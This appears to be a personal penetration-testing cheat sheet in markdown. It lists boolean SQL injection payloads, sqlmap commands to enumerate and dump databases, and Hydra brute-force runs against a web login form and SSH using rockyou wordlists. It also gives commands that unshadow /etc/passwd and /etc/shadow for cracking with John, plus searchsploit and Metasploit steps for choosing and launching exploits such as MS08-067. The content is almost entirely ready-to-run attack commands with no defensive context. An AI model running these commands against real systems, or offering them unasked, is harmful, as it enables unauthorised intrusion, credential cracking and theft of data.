


### Manual SQL

>- ' and 1=1; -- -  | True returns something

>- ' and 1=2;-- -   | False does not return anything
 
>- ' or 1=1; -- - 

>- ' or 1=2; -- - 


### SQLmap 


>- sqlmap -u "URL" -- > qquick enumeration fro the URL


>- sqlmap -u "URL" -b --> get the banner 


>- sqlmap -u "URL" --tables --> to get the tables 

>-  sqlmap -u "URL" --dumps --> dumps all the database

&nbsp;

### Hydra:

> -  hydra targetWebsite http-post-form "/login.php:user=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt  -f -v

&nbsp;
>  - hydra 192.168.2.4 ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-10.txt -f -v 

	
&nbsp;

	
### John

__Unshadow__

> - unshadow /etc/passwd /etc/shadow > hashes.txt 

> - john --wordlist=/usr/share/john/password.lst hashes

> - John --show hashes 


&nbsp;


### Metaploit:

### Searchsploit :

> - searchsploit nameofVuln OS_type
        
> - searchsolit rpc windows
            
> - searchsploit MS08-067 windows



### Metasploit :


> - search vlunerabilityName
        
> - search OSType
        
> - use pathof the exploit

> - show payloads

> - set payloads typeofPayload
        
> - set RHOST
        
> - set RPORT 
        
> - exploit



